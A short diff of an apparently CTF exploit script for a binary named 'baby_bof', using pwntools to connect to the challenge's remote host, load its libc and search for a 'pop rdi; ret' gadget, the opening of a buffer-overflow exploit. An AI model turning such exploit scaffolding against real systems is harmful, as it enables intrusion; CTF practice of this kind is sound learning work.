@@ -5,13 +5,8 @@ from pwn import *
 
 binary = context.binary = ELF('./baby_bof')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
-
-if args.REMOTE:
-    p = remote('dctf-chall-baby-bof.westeurope.azurecontainer.io', 7481)
-    libc = ELF('./libc.so.6')
-else:
-    p = process(binary.path)
-    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+p = remote('dctf-chall-baby-bof.westeurope.azurecontainer.io', 7481)
+libc = ELF('./libc.so.6')
 
 pop_rdi = next(binary.search(asm('pop rdi; ret')))
 
